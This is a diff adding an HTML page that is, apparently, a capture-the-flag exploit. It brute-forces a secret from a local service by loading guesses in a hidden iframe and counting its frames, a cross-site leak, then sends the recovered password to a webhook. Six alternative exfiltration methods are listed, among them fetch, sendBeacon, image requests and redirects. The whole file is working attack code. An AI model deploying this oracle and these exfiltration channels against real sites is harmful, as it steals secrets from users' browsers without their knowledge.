@@ -1,0 +1,90 @@
+<!doctype html>
+<html>
+<body>
+<pre id="log"></pre>
+<iframe id="f" style="display:none"></iframe>
+
+<script>
+const WEBHOOK = 'https://webhook/...' // change
+const TARGET = "http://127.0.0.1:9999/";
+const HEX = "0123456789abcdef"; // can be generalized to any alphabet
+let password = "lebah";
+
+const frame = document.getElementById("f");
+const log = document.getElementById("log");
+
+function println(msg) {
+    console.log(msg);
+    log.textContent += msg + "\n";
+}
+
+function loadGuess(guess) {
+    return new Promise(resolve => {
+        frame.onload = () => {
+            resolve(frame.contentWindow.length);
+        };
+        frame.src = `${TARGET}?pass=${encodeURIComponent(guess)}`;
+    });
+}
+
+async function bruteforce() {
+    println(`Starting with prefix: ${password}`);
+
+    while (true) {
+        let found = false;
+
+        for (const c of HEX) {
+            const guess = password + c;
+            const length = await loadGuess(guess);
+
+            println(`${guess} -> length=${length}`);
+
+            if (length === 1) {
+                password += c;
+                println(`Found next character: ${c}`);
+                println(`Current: ${password}`);
+                found = true;
+                break;
+            }
+        }
+
+        if (!found) {
+            println("FIN");
+            break;
+        }
+    }
+
+    println(`Recovered: ${password}`);
+    let pass = encodeURIComponent(password);
+    // method 1
+    fetch(WEBHOOK+'?fetch='+pass);
+
+    // method 2
+    // fetch(WEBHOOK+'?nocors='+pass, {
+    //     mode: "no-cors"
+    // });
+
+    // method 3
+    // navigator.sendBeacon(WEBHOOK+'/sendbeacon',pass)
+
+    // method 4
+    // new Image().src=`${WEBHOOK}?image=${pass}`
+
+    // method 5
+    // fetch(WEBHOOK+'/fetchpost', {
+    //   method: "POST",
+    //   mode: "no-cors",
+    //   headers: {
+    //     "Content-Type": "text/plain"
+    //   },
+    //   body: pass
+    // });
+
+    // method 6
+    // setTimeout(()=>location = `${WEBHOOK}?loc=${pass}`,5000)
+}
+
+bruteforce();
+</script>
+</body>
+</html>
